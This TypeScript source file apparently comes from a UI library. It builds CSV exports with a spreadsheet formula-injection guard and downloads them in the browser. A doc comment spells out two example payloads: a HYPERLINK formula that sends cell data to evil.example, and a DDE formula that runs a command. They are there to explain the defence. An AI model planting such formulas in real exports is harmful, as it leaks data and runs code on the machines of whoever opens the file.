/**
 * CSV serialisation and the browser-download step.
 *
 * Both used to exist four times over — `data-table` (Pro), `data-table-free`,
 * `gantt` and the admin template each rolled their own, and they had already
 * drifted on quoting and filenames. Export lives here so a fix lands once.
 *
 * CSV stays in the free tier deliberately: it costs nothing to ship, and a
 * paywall on comma-separated text would read as petty. Styled Excel and PDF
 * are the Pro surface — see `@styloviz-pro/export`.
 */

export interface SvCsvOptions {
  /**
   * Neutralise cells a spreadsheet would read as a formula. @default true
   *
   * ★★★ CSV IS CODE ONCE EXCEL OPENS IT. A text cell beginning with `=`, `+`,
   *     `-`, `@`, a tab or a carriage return is evaluated as a formula — so a
   *     customer named `=HYPERLINK("https://evil.example/?d="&A2,"Click")`, or a
   *     task titled `=cmd|' /C calc'!A0`, runs on the machine of whoever opens
   *     the export. The data came from one user; the formula runs for another
   *     (OWASP "CSV Injection"). The guard prefixes such a cell with `'`, which
   *     Excel, Sheets and LibreOffice all display as the literal text.
   *
   * Numbers are never touched (`-12.5` stays a number), and neither is a STRING
   * that is a plain number (`"-12.5"`, `"+44"`) — those cannot be formulae, and
   * prefixing them would turn a numeric column into text. Turn the guard off
   * only for a file that is not meant for a spreadsheet.
   */
  readonly formulaGuard?: boolean;
}

/** A cell a spreadsheet would treat as a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;
/** …unless the whole cell is just a number, which no spreadsheet evaluates. */
const PLAIN_NUMBER = /^[+-]?(\d+([.,]\d+)*|\.\d+)([eE][+-]?\d+)?%?$/;

/** `'` in front of a string cell that would otherwise run as a formula. */
export function svCsvFormulaSafe(value: string): string {
  return FORMULA_START.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
}

/**
 * Quotes a single cell when it contains a comma, quote, or newline, doubling
 * any embedded quote (RFC 4180). `null` / `undefined` become empty. String
 * cells pass through {@link svCsvFormulaSafe} first unless the guard is off.
 */
function csvCell(value: string | number | null | undefined, guard: boolean): string {
  let s = value == null ? '' : String(value);
  if (guard && typeof value === 'string') s = svCsvFormulaSafe(s);
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Builds CSV text from a header row and data rows.
 *
 * CRLF line endings, because Excel on Windows still treats a bare LF as one
 * long line in some locales.
 *
 * @example
 * ```ts
 * const csv = svToCsv(['Product', 'Revenue'], [['Aurora Lamp', 1299.5]]);
 * ```
 */
export function svToCsv(
  headers: readonly string[],
  rows: readonly (readonly (string | number | null | undefined)[])[],
  options: SvCsvOptions = {},
): string {
  const guard = options.formulaGuard ?? true;
  const line = (cells: readonly (string | number | null | undefined)[]): string =>
    cells.map((c) => csvCell(c, guard)).join(',');
  return [line(headers), ...rows.map(line)].join('\r\n');
}

/**
 * Triggers a browser download of a Blob. Temporary object URL + anchor click —
 * no server round-trip, no dependency.
 *
 * Pass the `Document` rather than reaching for a global so the helper stays
 * SSR-safe and testable; it no-ops when the document has no window.
 */
export function svDownloadBlob(doc: Document, filename: string, blob: Blob): void {
  const view = doc.defaultView;
  if (!view) return;
  const url = view.URL.createObjectURL(blob);
  const anchor = doc.createElement('a');
  anchor.href = url;
  anchor.download = filename;
  doc.body.appendChild(anchor);
  anchor.click();
  doc.body.removeChild(anchor);
  view.URL.revokeObjectURL(url);
}

/** Convenience wrapper: serialise text and download it in one call. */
export function svDownloadText(
  doc: Document,
  filename: string,
  content: string,
  mime = 'text/csv;charset=utf-8',
): void {
  svDownloadBlob(doc, filename, new Blob([content], { type: mime }));
}
